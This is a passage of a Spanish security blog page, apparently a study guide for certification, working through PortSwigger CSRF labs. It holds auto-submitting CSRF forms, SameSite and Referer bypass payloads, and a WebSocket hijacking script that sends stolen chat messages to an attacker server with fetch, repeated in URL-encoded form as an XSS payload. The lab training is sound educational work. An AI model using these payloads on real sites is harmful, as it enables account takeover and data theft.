+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amp;amount=1000000&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<p>Incluso si no se acepta el método GET algunos frameworks permiten modificar el método de la siguiente manera con el valor(_method)</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://vulnerable-website.com/account/transfer-payment&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;_method&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;GET&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;recipient&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;hacker&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;amount&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1000000&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<h3 id="solución-laboratorio-bypassing-samesite-lax-restrictions-using-get-requests">Solución laboratorio Bypassing SameSite Lax restrictions using GET requests</h3>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override" target="_blank" rel="noopener noreffer ">aqui</a>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://URL-VULNERABLE/my-account/change-email&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;GET&#34;</span> <span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;_method&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;antu97@test.com&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<h3 id="solución-al-laboratorio-con-refresco-de-cookie">Solución al laboratorio con refresco de cookie</h3>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh" target="_blank" rel="noopener noreffer ">aqui</a>.</p>
+<p>Si un sitio web no incluye un atributo SameSite al configurar una cookie, Chrome aplica automáticamente restricciones Lax de forma predeterminada. Sin embargo, para evitar romper los mecanismos de inicio de sesión único (SSO), en realidad no aplica estas restricciones durante los primeros 120 segundos en las solicitudes POST de nivel superior. Como resultado, hay una ventana de dos minutos en la que los usuarios pueden ser susceptibles a ataques entre sitios.</p>
+<p>Para eludir la restricción de la cookie con samesite lax nos aprovechamos de que los primeros 120 segundos se permiten peticiones POST.</p>
+<p>Para evitar el bloqueo por defecto del navegador del popup al ejecutar windows.open utilizamos la funcion window.onclick.</p>
+<p>A los 5 segundos de refrescar la sesión con window.open desde la url indicada se lanzara la petición post con el cambio de usuario.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://URL-VULNERABLE/my-account/change-email&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;antu97@test.com&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="nx">Click</span> <span class="nx">anywhere</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">page</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;https://URL-VULNERABLE/social-login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">changeEmail</span><span class="p">,</span> <span class="mi">5000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">changeEmail</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<h2 id="strict-bypass">Strict bypass</h2>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect" target="_blank" rel="noopener noreffer ">aquí.</a></p>
+<p>Se puede eludir esta cookie si existe un gadget en la web que genere una solicitud secundaria en el mismo sitio.</p>
+<p>En este caso al realizar un post se hace un redireccionamiento del momento en que se envía el post al blog con un parámetro postid, este parámetro permite inyectar valores al directorio por lo que pasando el directorio vulnerable del change email con valores de correo y submit se puede realizar el ataque, es posible ya que la petición también se puede realizar con GET</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;https://URL-VULNERABLE/post/comment/confirmation?postId=../my-account/change-email?email=antu%40web-security-academy.net%26submit=1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<h3 id="same-site-sibling-domaincswsh">Same site Sibling domain(CSWSH)</h3>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain" target="_blank" rel="noopener noreffer ">aqui</a></p>
+<p>Script html utilizado.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s1">&#39;wss://0ac60050047f30558226d44700ec00dc.web-security-academy.net/chat&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;READY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://SERVER-ATACANTE/exploit?message=&#39;</span> <span class="o">+</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">message</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<p>URLecodeado el script anterior y utilizando un origen permitido por la web podemos llevar a cabo la explotación de un CSRF a través de XSS en un login.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;https://URL-VULNERABLE-XSS/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%63%36%30%30%35%30%30%34%37%66%33%30%35%35%38%32%32%36%64%34%34%37%30%30%65%63%30%30%64%63%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%65%6e%74%2e%64%61%74%61%3b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%64%33%30%30%38%35%30%34%61%66%33%30%37%65%38%32%38%62%64%33%61%61%30%31%63%30%30%30%64%64%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%27%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&amp;password=test&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<p>Si queréis profundizar mas en este tipo de vulnerabilidad os recomiendo que le echéis un ojo a esta web: <a href="https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/" target="_blank" rel="noopener noreffer ">https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/</a></p>
+<h2 id="bypass-referer-header">Bypass referer header</h2>
+<p>Hay aplicaciones que validan esta cabecera cuando esta presente en la petición pero no realizan la validación si se omite por lo que se puede llegar a realizar un csrf omitiéndola.</p>
+<p>Para comprobar si es vulnerable:</p>
+<ol>
+<li>Cambiar dominio de referer y observar respuesta.</li>
+<li>Eliminar cabecera y comprobar respuesta.</li>
+</ol>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;referrer&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;never&#34;</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://URL-VULNERABLE/my-account/change-email&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;antu97@test.com&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;referrer&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;never&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present" target="_blank" rel="noopener noreffer ">aqu</a>í.</p>
+<p>Algunas aplicaciones solo validan que el valor de la cabecera contenga el dominio por lo que un atacante puede utilizar dicho dominio como subdominio del dominio del atacante como en el ejemplo siguiente:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">http</span><span class="o">:</span><span class="err">//vulnerable-website.com.attacker-website.com/csrf-attack</span></span></span></code></pre></div></div>
+<p>Otra forma de validación utilizadas por algunas aplicaciones es que el valor de la cabecera contenga el propio dominio por lo que se puede añadir el dominio del atacante a este.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">http</span><span class="o">:</span><span class="err">//vulnerable-website.com.attacker-website.com/csrf-attack</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c">&lt;!--</span> <span class="nx">CSRF</span> <span class="nx">PoC</span> <span class="o">-</span> <span class="nx">generated</span> <span class="nx">by</span> <span class="nx">Burp</span> <span class="nx">Suite</span> <span class="nx">Professional</span> <span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://ID-LABORATORIO.web-security-academy.net/my-account/change-email&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;antu97@test.com&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit request&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;/?ID-LABORATPORIO.web-security-academy.net&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken" target="_blank" rel="noopener noreffer ">aquí</a>.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Actualizado el 2025-11-02</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/es/csrf/index.md" target="_blank">Leer Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Compartir en X" data-sharer="x" data-url="http://localhost:1313/es/csrf/" data-title="Cross Site Request Forgery (CSRF)" data-hashtags="BSCP,Web,Pentesting,Csrf"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Threads" data-sharer="threads" data-url="http://localhost:1313/es/csrf/" data-title="Cross Site Request Forgery (CSRF)"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Facebook" data-sharer="facebook" data-url="http://localhost:1313/es/csrf/" data-hashtag="BSCP"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/es/csrf/"><i class="fab fa-linkedin" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/es/csrf/" data-title="Cross Site Request Forgery (CSRF)"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Line" data-sharer="line" data-url="http://localhost:1313/es/csrf/" data-title="Cross Site Request Forgery (CSRF)"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en 微博" data-sharer="weibo" data-url="http://localhost:1313/es/csrf/" data-title="Cross Site Request Forgery (CSRF)"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/es/csrf/" data-title="Cross Site Request Forgery (CSRF)" data-description=""><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fes%2fcsrf%2f&amp;text=Cross%20Site%20Request%20Forgery%20%28CSRF%29" target="_blank" title="Compartir en Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/es/tags/bscp/">BSCP</a>,&nbsp;<a href="/es/tags/web/">Web</a>,&nbsp;<a href="/es/tags/pentesting/">Pentesting</a>,&nbsp;<a href="/es/tags/csrf/">Csrf</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Regresar</a></span>&nbsp;|&nbsp;<span><a href="/es/">Inicio</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/es/agentec2/" class="prev" rel="prev" title="Ejecucion Agente AdaptixC2"><i class="fas fa-angle-left" aria-hidden="true"></i>Ejecucion Agente AdaptixC2</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Con la tecnología de <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.157.0">Hugo</a> | Tema - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/es/" target="_blank">AnTuSec</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Volver arriba">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Ver comentarios">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.es.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/es/index.json","lunrLanguageCode":"es","maxResultLength":10,"noResultsFound":"No se encontraron resultados","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
